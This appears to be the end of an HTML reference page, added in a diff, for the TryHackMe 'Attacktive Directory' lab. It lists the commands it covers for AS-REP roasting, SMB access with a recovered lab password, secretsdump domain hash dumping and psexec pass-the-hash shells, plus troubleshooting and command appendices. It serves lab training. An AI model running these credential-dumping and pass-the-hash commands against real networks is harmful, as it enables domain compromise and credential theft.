+                <div class="command-desc">Crack AS-REP hashes</div>
+            </div>
+            <div class="command-card">
+                <code>smbclient //10.48.165.142/backup -U svc-admin</code>
+                <div class="command-desc">Authenticated SMB access</div>
+            </div>
+            <div class="command-card">
+                <code>~/.local/bin/secretsdump.py spookysec.local/backup:backup2517860@10.48.165.142</code>
+                <div class="command-desc">Dump all domain hashes</div>
+            </div>
+            <div class="command-card">
+                <code>~/.local/bin/psexec.py spookysec.local/Administrator@10.48.165.142 -hashes LMHASH:NTHASH</code>
+                <div class="command-desc">Pass-the-hash shell access</div>
+            </div>
+            <div class="command-card">
+                <code>sudo openvpn ~/thm.ovpn</code>
+                <div class="command-desc">Connect to TryHackMe VPN</div>
+            </div>
+        </div>
+
+        <h3>File Download Commands</h3>
+        <pre>
+# User list
+wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+
+# Password list
+wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
+
+# Kerbrute
+wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
+chmod +x kerbrute_linux_amd64
+sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</pre>
+    </section>
+
+    <section>
+        <div class="section-num">/ TROUBLESHOOTING</div>
+        <h2>Comprehensive Error Resolution Matrix</h2>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Error Message</th>
+                        <th>Likely Cause</th>
+                        <th>Solution</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>Connection refused (port 88)</code></td>
+                        <td>Kerberos service not running or VPN disconnected</td>
+                        <td>Wait 5-10 minutes for DC boot. Verify VPN with <code>ip a | grep tun0</code>. Reconnect VPN if needed.</td>
+                    </tr>
+                    <tr>
+                        <td><code>Client not found in database</code></td>
+                        <td>Username doesn't exist or missing domain suffix</td>
+                        <td>Use full format: username@spookysec.local. Wait for kerbrute to finish enumeration.</td>
+                    </tr>
+                    <tr>
+                        <td><code>KDC_ERR_PREAUTH_REQUIRED</code></td>
+                        <td>User exists but requires pre-authentication</td>
+                        <td>This is normal for AS-REP roasting. It means the user is NOT vulnerable. Try other users.</td>
+                    </tr>
+                    <tr>
+                        <td><code>unrecognized arguments: -userfile</code></td>
+                        <td>Typo in parameter name</td>
+                        <td>Use <code>-usersfile</code> (with 's') not <code>-userfile</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>openwpn: command not found</code></td>
+                        <td>Typo in command name</td>
+                        <td>Use <code>openvpn</code> (with 'v') not <code>openwpn</code> (with 'w')</td>
+                    </tr>
+                    <tr>
+                        <td><code>Error: Unable to locate package</code></td>
+                        <td>Package name incorrect or repos not updated</td>
+                        <td>Run <code>sudo apt update</code> then try correct package name</td>
+                    </tr>
+                    <tr>
+                        <td><code>Permission denied</code> for /opt/</td>
+                        <td>Writing to system directory without sudo</td>
+                        <td>Use <code>sudo</code> or clone to home directory: <code>git clone ~/repo</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>100% packet loss</code></td>
+                        <td>VPN disconnected or machine not started</td>
+                        <td>Check VPN: <code>ip a | grep tun0</code>. Ensure machine is green in THM room.</td>
+                    </tr>
+                    <tr>
+                        <td><code>No valid users found</code> from kerbrute</td>
+                        <td>Domain Controller not ready or wrong domain name</td>
+                        <td>Verify domain with <code>nmap -p 88 10.48.165.142</code>. Wait for DC to fully boot.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ APPENDIX A</div>
+        <h2>Windows Commands Reference</h2>
+
+        <h3>File System Navigation</h3>
+        <pre>
+dir                     # List files (like ls)
+cd folder               # Change directory
+cd \                    # Go to root
+cd ..                   # Go up one level
+type file.txt           # View file contents (like cat)
+copy file1 file2        # Copy file
+move file1 folder       # Move file
+del file.txt            # Delete file
+mkdir folder            # Create directory
+rmdir folder            # Remove directory</pre>
+
+        <h3>System Information</h3>
+        <pre>
+whoami                  # Current user
+whoami /groups          # Group memberships
+hostname                # Computer name
+systeminfo              # Detailed system info
+ipconfig /all           # Network configuration
+netstat -an             # Network connections
+tasklist                # Running processes
+net users               # List local users
+net user /domain        # List domain users
+net group /domain       # List domain groups</pre>
+
+        <h3>File Searching</h3>
+        <pre>
+dir /s *flag*           # Search for files recursively
+findstr /s /i "flag" *  # Search inside files
+where /r C: flag.txt    # Locate specific file</pre>
+    </section>
+
+    <section>
+        <div class="section-num">/ APPENDIX B</div>
+        <h2>Linux Commands Reference</h2>
+
+        <pre>
+# File operations
+ls -la                  # List all files with details
+cat file.txt            # View file
+less file.txt           # Paginated view
+head -20 file.txt       # First 20 lines
+tail -20 file.txt       # Last 20 lines
+grep "pattern" file     # Search in file
+find . -name "*.txt"    # Find files
+wc -l file.txt          # Count lines
+
+# Network
+ping -c 4 IP            # Test connectivity
+nc -zv IP PORT          # Test port
+curl ifconfig.me        # Your public IP
+ip a                    # Interface info
+ss -tulpn               # Listening ports
+
+# Processes
+ps aux | grep process   # Find process
+top                     # Live process viewer
+kill -9 PID             # Force kill
+
+# Permissions
+chmod +x file           # Make executable
+chown user:user file    # Change ownership
+sudo command            # Run as root</pre>
+    </section>
+
+    <div class="flag-box">
+        <span class="flag-label">ROOM COMPLETION CHECKLIST</span>
+        <div class="flag-text">
+            Task 2: Enumeration ✓<br>
+            Task 3: Kerbrute ✓<br>
+            Task 4-5: AS-REP Roasting ✓<br>
+            Task 6: SMB Shares ✓<br>
+            Task 7: Secrets Dump ✓<br>
+            Task 8-9: Shell Access ✓
+        </div>
+    </div>
+
+    <footer>
+        &copy; 2026 // CYB3R3LLA // ATTACKTIVE DIRECTORY COMPLETE TECHNICAL REFERENCE<br>
+        Target: 10.48.165.142 // Domain: spookysec.local // Last Updated: March 2026
+    </footer>
+</div>
+
+</body>
+</html>
